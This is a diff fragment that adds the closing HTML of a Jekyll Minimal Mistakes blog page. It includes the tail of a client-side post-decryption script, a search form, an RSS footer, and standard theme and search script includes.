+      storedEncrypted = $('#secure-container').text().trim();
+      key =  $('#key').val();
+      decrypt(key);
+    });
+  });   
+</script>
+<div id="crypt_params"></div>
+<!-- end of post decryption -->
+
+  </div>
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 Philipp Menner. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
